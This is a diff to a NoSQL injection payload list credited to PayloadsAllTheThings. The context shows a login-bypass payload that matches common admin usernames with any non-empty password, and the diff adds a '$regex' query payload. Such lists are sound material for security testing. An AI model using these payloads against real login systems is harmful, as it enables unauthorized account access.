@@ -47,4 +47,9 @@ Extract data with "$in" query operator
 ---------------------------------------
 {"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
 
+
+Other
+-----
+{"$regex":"wien.*"}
+
 (Note: Payloads from PayloadsAllTheThings)
